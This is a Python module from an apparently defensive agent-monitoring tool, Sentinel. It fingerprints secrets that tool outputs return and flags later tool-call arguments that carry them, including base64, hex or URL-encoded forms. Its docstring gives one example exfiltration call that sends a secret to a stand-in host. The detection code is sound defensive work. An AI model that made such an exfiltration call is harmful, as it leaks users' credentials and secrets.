"""Content-level taint tracking.

When a tool returns sensitive material (DLP hits, or anything from a SECRET_ACCESS tool),
Sentinel stores *salted fingerprints* of the sensitive tokens - never the values. Every later
call's arguments are tokenised (including base64 / hex / percent-decoded variants) and
matched against those fingerprints. A match on an egress call is definitive evidence of
exfiltration, regardless of which tool is used or how innocuous it looks
(e.g. ``fetch("https://x.example/?q=<secret>")``).
"""

from __future__ import annotations

import base64
import binascii
import re
import secrets as pysecrets
from typing import Any
from urllib.parse import unquote, unquote_plus

from sentinel.dlp import TOKEN_RE, fingerprint, scan_secrets, shannon_entropy
from sentinel.netutil import walk_strings
from sentinel.store import StateStore

MAX_FINGERPRINTS = 2000


def secretish(token: str) -> bool:
    if len(token) < 8:
        return False
    has_alpha = any(c.isalpha() for c in token)
    has_other = any(not c.isalpha() for c in token)
    if has_alpha and has_other:
        return shannon_entropy(token) >= 2.5
    return len(token) >= 16 and shannon_entropy(token) >= 3.5


def sensitive_tokens_for_taint(text: str, *, secret_source: bool) -> set[str]:
    tokens = {m.value for m in scan_secrets(text)}
    for raw in TOKEN_RE.findall(text or ""):
        tok = raw.strip(".:,;\"'")
        if secret_source and secretish(tok):
            tokens.add(tok)
        elif len(tok) >= 16 and shannon_entropy(tok) >= 3.6 and secretish(tok):
            tokens.add(tok)
    return tokens


def _variants(text: str) -> set[str]:
    out = {text}
    for decoded in (unquote(text), unquote_plus(text)):
        out.add(decoded)
    for blob in re.findall(r"[A-Za-z0-9+/_-]{12,}={0,2}", text):
        try:
            raw = base64.b64decode(blob + "=" * (-len(blob) % 4), altchars=b"-_" if ("-" in blob or "_" in blob) else None)
            if raw and sum(32 <= b < 127 for b in raw) / len(raw) > 0.9:
                out.add(raw.decode("ascii", "ignore"))
        except (binascii.Error, ValueError):
            pass
    for blob in re.findall(r"(?:[0-9a-fA-F]{2}){8,}", text):
        try:
            raw = bytes.fromhex(blob)
            if raw and sum(32 <= b < 127 for b in raw) / len(raw) > 0.9:
                out.add(raw.decode("ascii", "ignore"))
        except ValueError:
            pass
    return out


def candidate_tokens(arguments: Any) -> set[str]:
    tokens: set[str] = set()
    for _key, value in walk_strings(arguments):
        for variant in _variants(value):
            tokens.add(variant.strip())
            for raw in TOKEN_RE.findall(variant):
                tokens.add(raw.strip(".:,;\"'"))
            for part in re.split(r"[\s/?&=#,;|]+", variant):
                if len(part) >= 8:
                    tokens.add(part.strip(".:,;\"'"))
    return {t for t in tokens if len(t) >= 8}


class TaintStore:
    def __init__(self, store: StateStore, ttl_seconds: int) -> None:
        self.store = store
        self.ttl = ttl_seconds

    def _load(self, workflow_id: str) -> dict[str, Any]:
        data = self.store.get_json(f"taint:{workflow_id}")
        if not isinstance(data, dict) or "salt" not in data:
            data = {"salt": pysecrets.token_hex(8), "fps": {}}
        return data

    def add(self, workflow_id: str, text: str, *, source: str, secret_source: bool) -> int:
        tokens = sensitive_tokens_for_taint(text, secret_source=secret_source)
        if not tokens:
            return 0
        data = self._load(workflow_id)
        fps: dict[str, str] = data.get("fps") or {}
        for tok in tokens:
            if len(fps) >= MAX_FINGERPRINTS:
                break
            fps[fingerprint(tok, data["salt"])] = source
        data["fps"] = fps
        self.store.setex(f"taint:{workflow_id}", self.ttl, data)
        return len(tokens)

    def match(self, workflow_id: str, arguments: Any) -> list[str]:
        data = self.store.get_json(f"taint:{workflow_id}")
        if not isinstance(data, dict) or not data.get("fps"):
            return []
        fps: dict[str, str] = data["fps"]
        hits: set[str] = set()
        for tok in candidate_tokens(arguments):
            src = fps.get(fingerprint(tok, data["salt"]))
            if src:
                hits.add(src)
        return sorted(hits)

    def size(self, workflow_id: str) -> int:
        data = self.store.get_json(f"taint:{workflow_id}")
        return len((data or {}).get("fps") or {}) if isinstance(data, dict) else 0
